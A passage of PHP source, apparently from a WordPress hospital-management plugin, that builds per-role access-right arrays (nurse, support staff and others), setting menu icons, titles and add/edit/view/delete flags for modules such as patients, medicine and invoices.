										"view"=>isset($_REQUEST['accountant_view'])?$_REQUEST['accountant_view']:1,
										"delete"=>isset($_REQUEST['accountant_delete'])?$_REQUEST['accountant_delete']:0
							  ],
							    "medicine"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Medicine.png'),
								         "menu_title"=>'Medicine',
										 "page_link"=>'medicine',
										 "own_data" => isset($_REQUEST['medicine_own_data'])?$_REQUEST['medicine_own_data']:1,
										 "add" => isset($_REQUEST['medicine_add'])?$_REQUEST['medicine_add']:0,
										"edit"=>isset($_REQUEST['medicine_edit'])?$_REQUEST['medicine_edit']:0,
										"view"=>isset($_REQUEST['medicine_view'])?$_REQUEST['medicine_view']:1,
										"delete"=>isset($_REQUEST['medicine_delete'])?$_REQUEST['medicine_delete']:0
							  ],
							    "treatment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Treatment.png'),
								          "menu_title"=>'Treatment',
										  "page_link"=>'treatment',
										   "own_data" => isset($_REQUEST['treatment_own_data'])?$_REQUEST['treatment_own_data']:0, 
										 "add" => isset($_REQUEST['treatment_add'])?$_REQUEST['treatment_add']:0,
										"edit"=>isset($_REQUEST['treatment_edit'])?$_REQUEST['treatment_edit']:0,
										"view"=>isset($_REQUEST['treatment_view'])?$_REQUEST['treatment_view']:1,
										"delete"=>isset($_REQUEST['treatment_delete'])?$_REQUEST['treatment_delete']:0
							  ],
							  
							  "prescription"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Prescription.png'),
							             "menu_title"=>'Prescription',
										 "page_link"=>'prescription',
										 "own_data" => isset($_REQUEST['prescription_own_data'])?$_REQUEST['prescription_own_data']:1,
										 "add" => isset($_REQUEST['prescription_add'])?$_REQUEST['prescription_add']:0,
										"edit"=>isset($_REQUEST['prescription_edit'])?$_REQUEST['prescription_edit']:0,
										"view"=>isset($_REQUEST['prescription_view'])?$_REQUEST['prescription_view']:1,
										"delete"=>isset($_REQUEST['prescription_delete'])?$_REQUEST['prescription_delete']:0
							  ],
							  
							  "bedallotment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Assign--Bed-nurse.png'),
							             "menu_title"=>'Assign Bed-Nurse',
										 "page_link"=>'bedallotment',
										  "own_data" => isset($_REQUEST['bedallotment_own_data'])?$_REQUEST['bedallotment_own_data']:1,
										 "add" => isset($_REQUEST['bedallotment_add'])?$_REQUEST['bedallotment_add']:0,
										"edit"=>isset($_REQUEST['bedallotment_edit'])?$_REQUEST['bedallotment_edit']:0,
										"view"=>isset($_REQUEST['bedallotment_view'])?$_REQUEST['bedallotment_view']:1,
										"delete"=>isset($_REQUEST['bedallotment_delete'])?$_REQUEST['bedallotment_delete']:0
							  ],
							  "operation"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Operation-List.png'),
							           "menu_title"=>'Operation List',
									   "page_link"=>'operation',
									   "own_data" => isset($_REQUEST['operation_own_data'])?$_REQUEST['operation_own_data']:1,
										 "add" => isset($_REQUEST['operation_add'])?$_REQUEST['operation_add']:0,
										"edit"=>isset($_REQUEST['operation_edit'])?$_REQUEST['operation_edit']:0,
										"view"=>isset($_REQUEST['operation_view'])?$_REQUEST['operation_view']:1,
										"delete"=>isset($_REQUEST['operation_delete'])?$_REQUEST['operation_delete']:0
							  ],
							  "diagnosis"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Diagnosis-Report.png'),
							              "menu_title"=>'Diagnosis',
										  "page_link"=>'diagnosis',
										  "own_data" => isset($_REQUEST['diagnosis_own_data'])?$_REQUEST['diagnosis_own_data']:1,
										 "add" => isset($_REQUEST['diagnosis_add'])?$_REQUEST['diagnosis_add']:0,
										"edit"=>isset($_REQUEST['diagnosis_edit'])?$_REQUEST['diagnosis_edit']:0,
										"view"=>isset($_REQUEST['diagnosis_view'])?$_REQUEST['diagnosis_view']:1,
										"delete"=>isset($_REQUEST['diagnosis_delete'])?$_REQUEST['diagnosis_delete']:0
							  ],
							  "bloodbank"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Blood-Bank.png'),
							            "menu_title"=>'Blood Bank',
										"page_link"=>'bloodbank',
										"own_data" => isset($_REQUEST['bloodbank_own_data'])?$_REQUEST['bloodbank_own_data']:1,
										 "add" => isset($_REQUEST['bloodbank_add'])?$_REQUEST['bloodbank_add']:0,
										"edit"=>isset($_REQUEST['bloodbank_edit'])?$_REQUEST['bloodbank_edit']:0,
										"view"=>isset($_REQUEST['bloodbank_view'])?$_REQUEST['bloodbank_view']:1,
										"delete"=>isset($_REQUEST['bloodbank_delete'])?$_REQUEST['bloodbank_delete']:0
							  ],
							  "appointment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Appointment.png'),
							             "menu_title"=>'Appointment',
										 "page_link"=>'appointment',
										  "own_data" => isset($_REQUEST['appointment_own_data'])?$_REQUEST['appointment_own_data']:1,
										 "add" => isset($_REQUEST['appointment_add'])?$_REQUEST['appointment_add']:1,
										"edit"=>isset($_REQUEST['appointment_edit'])?$_REQUEST['appointment_edit']:0,
										"view"=>isset($_REQUEST['appointment_view'])?$_REQUEST['appointment_view']:1,
										"delete"=>isset($_REQUEST['appointment_delete'])?$_REQUEST['appointment_delete']:0
							  ],
							  
							   "invoice"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/payment.png'),
							           "menu_title"=>'Invoice',
									   "page_link"=>'invoice',
									    "own_data" => isset($_REQUEST['invoice_own_data'])?$_REQUEST['invoice_own_data']:1,
										 "add" => isset($_REQUEST['invoice_add'])?$_REQUEST['invoice_add']:0,
										"edit"=>isset($_REQUEST['invoice_edit'])?$_REQUEST['invoice_edit']:0,
										"view"=>isset($_REQUEST['invoice_view'])?$_REQUEST['invoice_view']:1,
										"delete"=>isset($_REQUEST['invoice_delete'])?$_REQUEST['invoice_delete']:0
							  ],
							  
							   "event"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/notice.png'),
							            "menu_title"=>'Event',
										"page_link"=>'event',
										"own_data" => isset($_REQUEST['event_own_data'])?$_REQUEST['event_own_data']:1,
										 "add" => isset($_REQUEST['event_add'])?$_REQUEST['event_add']:0,
										"edit"=>isset($_REQUEST['event_edit'])?$_REQUEST['event_edit']:0,
										"view"=>isset($_REQUEST['event_view'])?$_REQUEST['event_view']:1,
										"delete"=>isset($_REQUEST['event_delete'])?$_REQUEST['event_delete']:0
							  ],
							  
							   "message"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/message.png'),							       
								         "menu_title"=>'Message',
										 "page_link"=>'message',
										  "own_data" => isset($_REQUEST['message_own_data'])?$_REQUEST['message_own_data']:1,
										 "add" => isset($_REQUEST['message_add'])?$_REQUEST['message_add']:1,
										"edit"=>isset($_REQUEST['message_edit'])?$_REQUEST['message_edit']:0,
										"view"=>isset($_REQUEST['message_view'])?$_REQUEST['message_view']:1,
										"delete"=>isset($_REQUEST['message_delete'])?$_REQUEST['message_delete']:1
							  ],
							  
							   "ambulance"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Ambulance.png'),
							              "menu_title"=>'Ambulance',
										  "page_link"=>'ambulance',
										  "own_data" => isset($_REQUEST['ambulance_own_data'])?$_REQUEST['ambulance_own_data']:1,
										 "add" => isset($_REQUEST['ambulance_add'])?$_REQUEST['ambulance_add']:1,
										"edit"=>isset($_REQUEST['ambulance_edit'])?$_REQUEST['ambulance_edit']:1,
										"view"=>isset($_REQUEST['ambulance_view'])?$_REQUEST['ambulance_view']:1,
										"delete"=>isset($_REQUEST['ambulance_delete'])?$_REQUEST['ambulance_delete']:0
							  ],
							   "instrument"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Instrument.png'),
							             "menu_title"=>'instrument',
										 "page_link"=>'instrument',
										  "own_data" => isset($_REQUEST['instrument_own_data'])?$_REQUEST['instrument_own_data']:1,
										 "add" => isset($_REQUEST['instrument_add'])?$_REQUEST['instrument_add']:0,
										"edit"=>isset($_REQUEST['instrument_edit'])?$_REQUEST['instrument_edit']:0,
										"view"=>isset($_REQUEST['instrument_view'])?$_REQUEST['instrument_view']:1,
										"delete"=>isset($_REQUEST['instrument_delete'])?$_REQUEST['instrument_delete']:0
							  ],
							  
							  "report"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Report.png'),
							           "menu_title"=>'Report',
									   "page_link"=>'report',
									   "own_data" => isset($_REQUEST['report_own_data'])?$_REQUEST['report_own_data']:0,
										"add" => isset($_REQUEST['report_add'])?$_REQUEST['report_add']:0,
										"edit"=>isset($_REQUEST['report_edit'])?$_REQUEST['report_edit']:0,
										"view"=>isset($_REQUEST['report_view'])?$_REQUEST['report_view']:0,
										"delete"=>isset($_REQUEST['report_delete'])?$_REQUEST['report_delete']:0
							  ],
							  
							  "account"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/account.png'),
							            "menu_title"=>'Account',
										"page_link"=>'account',
										"own_data" => isset($_REQUEST['account_own_data'])?$_REQUEST['account_own_data']:1,
										 "add" => isset($_REQUEST['account_add'])?$_REQUEST['account_add']:1,
										"edit"=>isset($_REQUEST['account_edit'])?$_REQUEST['account_edit']:1,
										"view"=>isset($_REQUEST['account_view'])?$_REQUEST['account_view']:1,
										"delete"=>isset($_REQUEST['account_delete'])?$_REQUEST['account_delete']:0
							  ]
						];			
			
			$role_access_right_nurse = array();			
			$role_access_right_nurse['nurse'] = [
							"doctor"=>["menu_icone"=>plugins_url('hospital-management/assets/images/icon/doctor.png'),
							           "menu_title"=>'Doctor',
							           "page_link"=>'doctor',
									    "own_data" =>isset($_REQUEST['doctor_own_data'])?$_REQUEST['doctor_own_data']:0,
									   "add" =>isset($_REQUEST['doctor_add'])?$_REQUEST['doctor_add']:0,
										"edit"=>isset($_REQUEST['doctor_edit'])?$_REQUEST['doctor_edit']:0,
										"view"=>isset($_REQUEST['doctor_view'])?$_REQUEST['doctor_view']:1,
										"delete"=>isset($_REQUEST['doctor_delete'])?$_REQUEST['doctor_delete']:0
										],
												
						  "outpatient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/outpatient.png'),
						              "menu_title"=>'Outpatient',
						              "page_link"=>'outpatient',
									  "own_data" => isset($_REQUEST['outpatient_own_data'])?$_REQUEST['outpatient_own_data']:1,
									 "add" => isset($_REQUEST['outpatient_add'])?$_REQUEST['outpatient_add']:0,
									"edit"=>isset($_REQUEST['outpatient_edit'])?$_REQUEST['outpatient_edit']:0,
									"view"=>isset($_REQUEST['outpatient_view'])?$_REQUEST['outpatient_view']:1,
									"delete"=>isset($_REQUEST['outpatient_delete'])?$_REQUEST['outpatient_delete']:0
						  ],
									  
							"patient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Patient.png'),
							        "menu_title"=>'Inpatient',
									"page_link"=>'patient',
									"own_data" => isset($_REQUEST['patient_own_data'])?$_REQUEST['patient_own_data']:1,
									 "add" => isset($_REQUEST['patient_add'])?$_REQUEST['patient_add']:0,
									"edit"=>isset($_REQUEST['patient_edit'])?$_REQUEST['patient_edit']:0,
									"view"=>isset($_REQUEST['patient_view'])?$_REQUEST['patient_view']:1,
									"delete"=>isset($_REQUEST['patient_delete'])?$_REQUEST['patient_delete']:0
						  ],
									  
							  "nurse"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Nurse.png'),
							            "menu_title"=>'Nurse',
										"page_link"=>'nurse',
										"own_data" => isset($_REQUEST['nurse_own_data'])?$_REQUEST['nurse_own_data']:1,
										 "add" => isset($_REQUEST['nurse_add'])?$_REQUEST['nurse_add']:0,
										"edit"=>isset($_REQUEST['nurse_edit'])?$_REQUEST['nurse_edit']:0,
										"view"=>isset($_REQUEST['nurse_view'])?$_REQUEST['nurse_view']:1,
										"delete"=>isset($_REQUEST['nurse_delete'])?$_REQUEST['nurse_delete']:0
							  ],
							  
							  "supportstaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/support.png'),
							             "menu_title"=>'Support Staff',
										 "page_link"=>'supportstaff',
										  "own_data" => isset($_REQUEST['supportstaff_own_data'])?$_REQUEST['supportstaff_own_data']:0,
										 "add" => isset($_REQUEST['supportstaff_add'])?$_REQUEST['supportstaff_add']:0,
										"edit"=>isset($_REQUEST['supportstaff_edit'])?$_REQUEST['supportstaff_edit']:0,
										"view"=>isset($_REQUEST['supportstaff_view'])?$_REQUEST['supportstaff_view']:1,
										"delete"=>isset($_REQUEST['supportstaff_delete'])?$_REQUEST['supportstaff_delete']:0
							  ],
							  "pharmacist"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Pharmacist.png'),
									   "menu_title"=>'Pharmacist',
									   "page_link"=>'pharmacist',
										"own_data" => isset($_REQUEST['pharmacist_own_data'])?$_REQUEST['pharmacist_own_data']:0,
										 "add" => isset($_REQUEST['pharmacist_add'])?$_REQUEST['pharmacist_add']:0,
										"edit"=>isset($_REQUEST['pharmacist_edit'])?$_REQUEST['pharmacist_edit']:0,
										"view"=>isset($_REQUEST['pharmacist_view'])?$_REQUEST['pharmacist_view']:1,
										"delete"=>isset($_REQUEST['pharmacist_delete'])?$_REQUEST['pharmacist_delete']:0
							  ],
							  
							    "laboratorystaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Laboratorist.png'),
								         "menu_title"=>'Laboratory Staff',
										 "page_link"=>'laboratorystaff',
										 "own_data" => isset($_REQUEST['laboratorystaff_own_data'])?$_REQUEST['laboratorystaff_own_data']:0,
										 "add" => isset($_REQUEST['laboratorystaff_add'])?$_REQUEST['laboratorystaff_add']:0,
										"edit"=>isset($_REQUEST['laboratorystaff_edit'])?$_REQUEST['laboratorystaff_edit']:0,
										"view"=>isset($_REQUEST['laboratorystaff_view'])?$_REQUEST['laboratorystaff_view']:1,
										"delete"=>isset($_REQUEST['laboratorystaff_delete'])?$_REQUEST['laboratorystaff_delete']:0
							  ],						  
							  
							"accountant"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Accountant.png'),
									 "menu_title"=>'Accountant',
									 "page_link"=>'accountant',
									 "own_data" => isset($_REQUEST['accountant_own_data'])?$_REQUEST['accountant_own_data']:0,
									 "add" => isset($_REQUEST['accountant_add'])?$_REQUEST['accountant_add']:0,
									"edit"=>isset($_REQUEST['accountant_edit'])?$_REQUEST['accountant_edit']:0,
									"view"=>isset($_REQUEST['accountant_view'])?$_REQUEST['accountant_view']:1,
									"delete"=>isset($_REQUEST['accountant_delete'])?$_REQUEST['accountant_delete']:0
							  ],
							    "medicine"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Medicine.png'),
								         "menu_title"=>'Medicine',
										 "page_link"=>'medicine',
										 "own_data" => isset($_REQUEST['medicine_own_data'])?$_REQUEST['medicine_own_data']:0,
										 "add" => isset($_REQUEST['medicine_add'])?$_REQUEST['medicine_add']:0,
										"edit"=>isset($_REQUEST['medicine_edit'])?$_REQUEST['medicine_edit']:0,
										"view"=>isset($_REQUEST['medicine_view'])?$_REQUEST['medicine_view']:1,
										"delete"=>isset($_REQUEST['medicine_delete'])?$_REQUEST['medicine_delete']:0
							  ],
							    "treatment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Treatment.png'),
								          "menu_title"=>'Treatment',
										  "page_link"=>'treatment',
										   "own_data" => isset($_REQUEST['treatment_own_data'])?$_REQUEST['treatment_own_data']:0,
										 "add" => isset($_REQUEST['treatment_add'])?$_REQUEST['treatment_add']:0,
										"edit"=>isset($_REQUEST['treatment_edit'])?$_REQUEST['treatment_edit']:0,
										"view"=>isset($_REQUEST['treatment_view'])?$_REQUEST['treatment_view']:1,
										"delete"=>isset($_REQUEST['treatment_delete'])?$_REQUEST['treatment_delete']:0
							  ],
							  
							  "prescription"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Prescription.png'),
							             "menu_title"=>'Prescription',
										 "page_link"=>'prescription',
										 "own_data" => isset($_REQUEST['prescription_own_data'])?$_REQUEST['prescription_own_data']:0,
										 "add" => isset($_REQUEST['prescription_add'])?$_REQUEST['prescription_add']:1,
										"edit"=>isset($_REQUEST['prescription_edit'])?$_REQUEST['prescription_edit']:0,
										"view"=>isset($_REQUEST['prescription_view'])?$_REQUEST['prescription_view']:1,
										"delete"=>isset($_REQUEST['prescription_delete'])?$_REQUEST['prescription_delete']:0
							  ],
							  
							  "bedallotment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Assign--Bed-nurse.png'),
							             "menu_title"=>'Assign Bed-Nurse',
										 "page_link"=>'bedallotment',
										 "own_data" => isset($_REQUEST['bedallotment_own_data'])?$_REQUEST['bedallotment_own_data']:0,
										 "add" => isset($_REQUEST['bedallotment_add'])?$_REQUEST['bedallotment_add']:1,
										"edit"=>isset($_REQUEST['bedallotment_edit'])?$_REQUEST['bedallotment_edit']:1,
										"view"=>isset($_REQUEST['bedallotment_view'])?$_REQUEST['bedallotment_view']:1,
										"delete"=>isset($_REQUEST['bedallotment_delete'])?$_REQUEST['bedallotment_delete']:1
							  ],
							  "operation"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Operation-List.png'),
							           "menu_title"=>'Operation List',
									   "page_link"=>'operation',
									   "own_data" => isset($_REQUEST['operation_own_data'])?$_REQUEST['operation_own_data']:0,
										"add" => isset($_REQUEST['operation_add'])?$_REQUEST['operation_add']:1,
										"edit"=>isset($_REQUEST['operation_edit'])?$_REQUEST['operation_edit']:1,
										"view"=>isset($_REQUEST['operation_view'])?$_REQUEST['operation_view']:1,
										"delete"=>isset($_REQUEST['operation_delete'])?$_REQUEST['operation_delete']:0
							  ],
							  "diagnosis"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Diagnosis-Report.png'),
							              "menu_title"=>'Diagnosis',
										  "page_link"=>'diagnosis',
										  "own_data" => isset($_REQUEST['diagnosis_own_data'])?$_REQUEST['diagnosis_own_data']:0,
										 "add" => isset($_REQUEST['diagnosis_add'])?$_REQUEST['diagnosis_add']:0,
										"edit"=>isset($_REQUEST['diagnosis_edit'])?$_REQUEST['diagnosis_edit']:0,
										"view"=>isset($_REQUEST['diagnosis_view'])?$_REQUEST['diagnosis_view']:1,
										"delete"=>isset($_REQUEST['diagnosis_delete'])?$_REQUEST['diagnosis_delete']:0
							  ],
							  "bloodbank"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Blood-Bank.png'),
							            "menu_title"=>'Blood Bank',
										"page_link"=>'bloodbank',
										"own_data" => isset($_REQUEST['bloodbank_own_data'])?$_REQUEST['bloodbank_own_data']:0,
										 "add" => isset($_REQUEST['bloodbank_add'])?$_REQUEST['bloodbank_add']:0,
										"edit"=>isset($_REQUEST['bloodbank_edit'])?$_REQUEST['bloodbank_edit']:0,
										"view"=>isset($_REQUEST['bloodbank_view'])?$_REQUEST['bloodbank_view']:1,
										"delete"=>isset($_REQUEST['bloodbank_delete'])?$_REQUEST['bloodbank_delete']:0
							  ],
							  "appointment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Appointment.png'),
							             "menu_title"=>'Appointment',
										 "page_link"=>'appointment',
										 "own_data" => isset($_REQUEST['appointment_own_data'])?$_REQUEST['appointment_own_data']:0,
										 "add" => isset($_REQUEST['appointment_add'])?$_REQUEST['appointment_add']:1,
										"edit"=>isset($_REQUEST['appointment_edit'])?$_REQUEST['appointment_edit']:0,
										"view"=>isset($_REQUEST['appointment_view'])?$_REQUEST['appointment_view']:1,
										"delete"=>isset($_REQUEST['appointment_delete'])?$_REQUEST['appointment_delete']:0
							  ],
							  
							   "invoice"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/payment.png'),
							           "menu_title"=>'Invoice',
									   "page_link"=>'invoice',
									   "own_data" => isset($_REQUEST['invoice_own_data'])?$_REQUEST['invoice_own_data']:0,
										 "add" => isset($_REQUEST['invoice_add'])?$_REQUEST['invoice_add']:0,
										"edit"=>isset($_REQUEST['invoice_edit'])?$_REQUEST['invoice_edit']:0,
										"view"=>isset($_REQUEST['invoice_view'])?$_REQUEST['invoice_view']:0,
										"delete"=>isset($_REQUEST['invoice_delete'])?$_REQUEST['invoice_delete']:0
							  ],
							  
							   "event"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/notice.png'),
							            "menu_title"=>'Event',
										"page_link"=>'event',
										 "own_data" => isset($_REQUEST['event_own_data'])?$_REQUEST['event_own_data']:1,
										 "add" => isset($_REQUEST['event_add'])?$_REQUEST['event_add']:1,
										"edit"=>isset($_REQUEST['event_edit'])?$_REQUEST['event_edit']:0,
										"view"=>isset($_REQUEST['event_view'])?$_REQUEST['event_view']:1,
										"delete"=>isset($_REQUEST['event_delete'])?$_REQUEST['event_delete']:0
							  ],
							  
							   "message"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/message.png'),							       
								         "menu_title"=>'Message',
										 "page_link"=>'message',
										 "own_data" => isset($_REQUEST['message_own_data'])?$_REQUEST['message_own_data']:1,
										 "add" => isset($_REQUEST['message_add'])?$_REQUEST['message_add']:1,
										"edit"=>isset($_REQUEST['message_edit'])?$_REQUEST['message_edit']:0,
										"view"=>isset($_REQUEST['message_view'])?$_REQUEST['message_view']:1,
										"delete"=>isset($_REQUEST['message_delete'])?$_REQUEST['message_delete']:1
							  ],
							  
							   "ambulance"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Ambulance.png'),
							              "menu_title"=>'Ambulance',
										  "page_link"=>'ambulance',
										  "own_data" => isset($_REQUEST['ambulance_own_data'])?$_REQUEST['ambulance_own_data']:0,
										 "add" => isset($_REQUEST['ambulance_add'])?$_REQUEST['ambulance_add']:1,
										"edit"=>isset($_REQUEST['ambulance_edit'])?$_REQUEST['ambulance_edit']:1,
										"view"=>isset($_REQUEST['ambulance_view'])?$_REQUEST['ambulance_view']:1,
										"delete"=>isset($_REQUEST['ambulance_delete'])?$_REQUEST['ambulance_delete']:0
							  ],
							   "instrument"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Instrument.png'),
							             "menu_title"=>'instrument',
										 "page_link"=>'instrument',
										 "own_data" => isset($_REQUEST['instrument_own_data'])?$_REQUEST['instrument_own_data']:0,
										 "add" => isset($_REQUEST['instrument_add'])?$_REQUEST['instrument_add']:0,
										"edit"=>isset($_REQUEST['instrument_edit'])?$_REQUEST['instrument_edit']:0,
										"view"=>isset($_REQUEST['instrument_view'])?$_REQUEST['instrument_view']:1,
										"delete"=>isset($_REQUEST['instrument_delete'])?$_REQUEST['instrument_delete']:0
							  ],
							  
							  "report"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Report.png'),
							           "menu_title"=>'Report',
									   "page_link"=>'report',
									   "own_data" => isset($_REQUEST['report_own_data'])?$_REQUEST['report_own_data']:0,
										"add" => isset($_REQUEST['report_add'])?$_REQUEST['report_add']:0,
										"edit"=>isset($_REQUEST['report_edit'])?$_REQUEST['report_edit']:0,
										"view"=>isset($_REQUEST['report_view'])?$_REQUEST['report_view']:1,
										"delete"=>isset($_REQUEST['report_delete'])?$_REQUEST['report_delete']:0
							  ],
							  
							  "account"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/account.png'),
							            "menu_title"=>'Account',
										"page_link"=>'account',
										"own_data" => isset($_REQUEST['account_own_data'])?$_REQUEST['account_own_data']:1,
										"add" => isset($_REQUEST['account_add'])?$_REQUEST['account_add']:1,
										"edit"=>isset($_REQUEST['account_edit'])?$_REQUEST['account_edit']:1,
										"view"=>isset($_REQUEST['account_view'])?$_REQUEST['account_view']:1,
										"delete"=>isset($_REQUEST['account_delete'])?$_REQUEST['account_delete']:0
							  ]
						];			
			$role_access_right_supportstaff = array();
			
			$role_access_right_supportstaff['SupportStaff'] = [
							"doctor"=>["menu_icone"=>plugins_url('hospital-management/assets/images/icon/doctor.png'),
							           "menu_title"=>'Doctor',
							           "page_link"=>'doctor',
									   "own_data" =>isset($_REQUEST['doctor_own_data'])?$_REQUEST['doctor_own_data']:0,
									   "add" =>isset($_REQUEST['doctor_add'])?$_REQUEST['doctor_add']:0,
										"edit"=>isset($_REQUEST['doctor_edit'])?$_REQUEST['doctor_edit']:0,
										"view"=>isset($_REQUEST['doctor_view'])?$_REQUEST['doctor_view']:1,
										"delete"=>isset($_REQUEST['doctor_delete'])?$_REQUEST['doctor_delete']:0
										],
												
						  "outpatient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/outpatient.png'),
						            "menu_title"=>'Outpatient',
						            "page_link"=>'outpatient',
									"own_data" => isset($_REQUEST['outpatient_own_data'])?$_REQUEST['outpatient_own_data']:0,
									 "add" => isset($_REQUEST['outpatient_add'])?$_REQUEST['outpatient_add']:0,
									"edit"=>isset($_REQUEST['outpatient_edit'])?$_REQUEST['outpatient_edit']:0,
									"view"=>isset($_REQUEST['outpatient_view'])?$_REQUEST['outpatient_view']:1,
									"delete"=>isset($_REQUEST['outpatient_delete'])?$_REQUEST['outpatient_delete']:0
						  ],
									  
							"patient"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Patient.png'),
							        "menu_title"=>'Inpatient',
									"page_link"=>'patient',
									"own_data" => isset($_REQUEST['patient_own_data'])?$_REQUEST['patient_own_data']:0,
									 "add" => isset($_REQUEST['patient_add'])?$_REQUEST['patient_add']:0,
									"edit"=>isset($_REQUEST['patient_edit'])?$_REQUEST['patient_edit']:0,
									"view"=>isset($_REQUEST['patient_view'])?$_REQUEST['patient_view']:1,
									"delete"=>isset($_REQUEST['patient_delete'])?$_REQUEST['patient_delete']:0
						  ],
									  
							  "nurse"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Nurse.png'),
							            "menu_title"=>'Nurse',
										"page_link"=>'nurse',
										"own_data" => isset($_REQUEST['nurse_own_data'])?$_REQUEST['nurse_own_data']:0,
										 "add" => isset($_REQUEST['nurse_add'])?$_REQUEST['nurse_add']:0,
										"edit"=>isset($_REQUEST['nurse_edit'])?$_REQUEST['nurse_edit']:0,
										"view"=>isset($_REQUEST['nurse_view'])?$_REQUEST['nurse_view']:1,
										"delete"=>isset($_REQUEST['nurse_delete'])?$_REQUEST['nurse_delete']:0
							  ],
							  
							  "supportstaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/support.png'),
							             "menu_title"=>'Support Staff',
										 "page_link"=>'supportstaff',
										 "own_data" => isset($_REQUEST['supportstaff_own_data'])?$_REQUEST['supportstaff_own_data']:1,
										 "add" => isset($_REQUEST['supportstaff_add'])?$_REQUEST['supportstaff_add']:0,
										"edit"=>isset($_REQUEST['supportstaff_edit'])?$_REQUEST['supportstaff_edit']:0,
										"view"=>isset($_REQUEST['supportstaff_view'])?$_REQUEST['supportstaff_view']:1,
										"delete"=>isset($_REQUEST['supportstaff_delete'])?$_REQUEST['supportstaff_delete']:0
							  ],
							  "pharmacist"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Pharmacist.png'),
									   "menu_title"=>'Pharmacist',
									   "page_link"=>'pharmacist',
									   "own_data" => isset($_REQUEST['pharmacist_own_data'])?$_REQUEST['pharmacist_own_data']:0,
										"add" => isset($_REQUEST['pharmacist_add'])?$_REQUEST['pharmacist_add']:0,
										"edit"=>isset($_REQUEST['pharmacist_edit'])?$_REQUEST['pharmacist_edit']:0,
										"view"=>isset($_REQUEST['pharmacist_view'])?$_REQUEST['pharmacist_view']:1,
										"delete"=>isset($_REQUEST['pharmacist_delete'])?$_REQUEST['pharmacist_delete']:0
							  ],
							  
							    "laboratorystaff"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Laboratorist.png'),
								         "menu_title"=>'Laboratory Staff',
										 "page_link"=>'laboratorystaff',
										 "own_data" => isset($_REQUEST['laboratorystaff_own_data'])?$_REQUEST['laboratorystaff_own_data']:0,
										 "add" => isset($_REQUEST['laboratorystaff_add'])?$_REQUEST['laboratorystaff_add']:0,
										"edit"=>isset($_REQUEST['laboratorystaff_edit'])?$_REQUEST['laboratorystaff_edit']:0,
										"view"=>isset($_REQUEST['laboratorystaff_view'])?$_REQUEST['laboratorystaff_view']:1,
										"delete"=>isset($_REQUEST['laboratorystaff_delete'])?$_REQUEST['laboratorystaff_delete']:0
							  ],
							  
							  
							    "accountant"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Accountant.png'),
								        "menu_title"=>'Accountant',
										"page_link"=>'accountant',
										"own_data" => isset($_REQUEST['accountant_own_data'])?$_REQUEST['accountant_own_data']:0,
										 "add" => isset($_REQUEST['accountant_add'])?$_REQUEST['accountant_add']:0,
										"edit"=>isset($_REQUEST['accountant_edit'])?$_REQUEST['accountant_edit']:0,
										"view"=>isset($_REQUEST['accountant_view'])?$_REQUEST['accountant_view']:1,
										"delete"=>isset($_REQUEST['accountant_delete'])?$_REQUEST['accountant_delete']:0
							  ],
							    "medicine"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Medicine.png'),
								         "menu_title"=>'Medicine',
										 "page_link"=>'medicine',
										  "own_data" => isset($_REQUEST['medicine_own_data'])?$_REQUEST['medicine_own_data']:0,
										 "add" => isset($_REQUEST['medicine_add'])?$_REQUEST['medicine_add']:0,
										"edit"=>isset($_REQUEST['medicine_edit'])?$_REQUEST['medicine_edit']:0,
										"view"=>isset($_REQUEST['medicine_view'])?$_REQUEST['medicine_view']:1,
										"delete"=>isset($_REQUEST['medicine_delete'])?$_REQUEST['medicine_delete']:0
							  ],
							    "treatment"=>['menu_icone'=>plugins_url( 'hospital-management/assets/images/icon/Treatment.png'),
								          "menu_title"=>'Treatment',
										  "page_link"=>'treatment',
										  "own_data" => isset($_REQUEST['treatment_own_data'])?$_REQUEST['treatment_own_data']:0,
